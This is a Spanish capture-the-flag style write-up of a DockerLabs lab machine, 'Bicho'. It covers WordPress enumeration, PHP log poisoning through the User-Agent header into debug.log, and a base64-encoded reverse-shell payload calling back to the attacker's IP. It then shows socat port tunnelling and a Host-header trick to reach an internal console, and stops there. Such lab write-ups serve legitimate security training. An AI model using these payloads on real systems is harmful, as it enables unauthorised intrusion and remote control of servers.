# 🧠 **Informe de Pentesting – Máquina: Bicho**

### 💡 **Dificultad:** Fácil

📦 **Plataforma:** DockerLabs

🌐 **Objetivo:** Obtener acceso total (root) explotando servicios expuestos y configuraciones inseguras en una instalación de WordPress.

---

## 🚀 **Despliegue de la Máquina**

Se inicia la máquina vulnerable descomprimiendo el archivo y ejecutando el script de despliegue:

```bash
unzip bicho.zip
sudo bash auto_deploy.sh backend.tar
```

![Despliegue](Imágenes/2025-05-20_04-42.png)

---

## 📶 **Comprobación de Conectividad**

Validamos que la máquina responde:

```bash
ping -c1 172.17.0.2
```

![Ping](Imágenes/Capturas_1.png)

---

## 🔍 **Escaneo de Puertos**

### 🔎 Escaneo Total

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

**Puertos abiertos:**

* `22/tcp`: SSH
* `80/tcp`: HTTP

![Puertos](Imágenes/Capturas_2.png)

### 🧩 Detección de Servicios

```bash
nmap -sCV -p22,80 172.17.0.2 -oN target.txt
```

![Servicios](Imágenes/Capturas_3.png)

---

## 🧭 **Reconocimiento Web**

### 🖥️ Acceso inicial

Al acceder a `http://172.17.0.2`, se muestra una página de bienvenida.

![Página](Imágenes/Capturas_5.png)

### 🧾 Hosts

Agregamos el nombre de dominio al archivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Añadir línea:
172.17.0.2 bicho.dl
```

![etc/hosts](Imágenes/Capturas_4.png)

---

### 🔎 Análisis con WhatWeb

```bash
whatweb http://bicho.dl
```

Detectamos que el sitio corre **WordPress 6.6.2**.

![Versiones](Imágenes/Capturas_6.png)

---

## 🛠️ **Enumeración en WordPress**

### 🔍 WPScan

Enumeramos usuarios y directorios:

```bash
wpscan --url http://bicho.dl/ --enumerate u
```

* Usuario encontrado: `bicho`
* Archivos sensibles y rutas descubiertas

![wpscan](Imágenes/Capturas_7.png)

---

### 🗂️ Fuzzing de Directorios

```bash
gobuster dir -u http://bicho.dl/wp-content/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

**Rutas encontradas:**

* `/index.php`
* `/themes/`
* `/uploads/`
* `/plugins/`
* `/fonts/`
* `/upgrade/`

![Fuzzing](Imágenes/Capturas_8.png)

---

## 🕵️‍♂️ **Log Poisoning en WordPress**

### 🐾 Archivo sospechoso

Durante el escaneo detectamos `debug.log`:

```bash
http://bicho.dl/wp-content/debug.log
```

![logs](Imágenes/Capturas_9.png)

---

### 🐚 Inyección vía User-Agent

Interceptamos el login con Burp Suite y lo mandamos a **Repeater**.

![Intercept](Imágenes/Capturas_14.png)

Modificamos la cabecera:

```
User-Agent: <?php phpinfo(); ?>
```

![LogPoisoning](Imágenes/Capturas_15.png)

---

### 💥 Ejecución exitosa

Al visitar de nuevo el archivo `debug.log`, vemos la ejecución de `phpinfo()`:

![PHP](Imágenes/Capturas_16.png)

---

## 🐍 **Obteniendo Reverse Shell**

### 🧨 Inyección de Payload

Escuchamos con Netcat:

```bash
sudo nc -lvnp 443
```

Y enviamos este payload en User-Agent:

```php
<?php echo `printf c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjg0LzQ0MyAwPiYx | base64 -d | bash`; ?>
```

📌 *Este código inyecta un comando que conecta de vuelta al atacante.*

![RevShell](Imágenes/Capturas_17.png)

---

## 🔐 **Post-Explotación y Escaneo Interno**

### 🧾 Puertos internos

```bash
netstat -tuln
```

```text
127.0.0.1:3306    → MySQL  
127.0.0.1:5000    → Web Interno  
```

---

## 🔁 **Tunelización de Puertos con Socat**

### 🚫 Error inicial

`socat` no está disponible y al transferirlo, aparece un error de librería:

```bash
./socat: error while loading shared libraries: libwrap.so.0
```

---

### ✅ Solución

1. **Transferir socat y la librería:**

```bash
# En máquina atacante
cp /usr/bin/socat .
cp /usr/lib/x86_64-linux-gnu/libwrap.so.0 .
python3 -m http.server 8000
```

2. **En la víctima:**

```bash
wget http://<IP>:8000/socat
wget http://<IP>:8000/libwrap.so.0 -O /tmp/libwrap.so.0
chmod +x socat
export LD_LIBRARY_PATH=/tmp
```

3. **Tunelizar:**

```bash
./socat TCP-LISTEN:7755,fork TCP:127.0.0.1:5000
```

![Socat](Imágenes/Capturas_18.png)
![Libreria](Imágenes/Capturas_19.png)

---

## 🌐 **Exploración del Servicio Interno**

Visitamos:

```
http://172.17.0.2:7755/
```

¡Y accedemos a la web interna!

![WebInterna](Imágenes/Capturas_20.png)

---

### 📂 Fuzzing interno

```bash
gobuster dir -u http://172.17.0.2:7755/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

📌 Ruta importante encontrada: `/console`

![FuzzingInterno](Imágenes/Capturas_21.png)

---

### 🧪 Interacción con Burp Suite

Usamos Burp para modificar el `Host` en la cabecera y acceder correctamente a `/console`:

Original:

```
Host: 172.17.0.2:7755
```

Modificado:

```
Host: 127.0.0.1
```

Esto permite visualizar la consola de administración interna protegida.

---

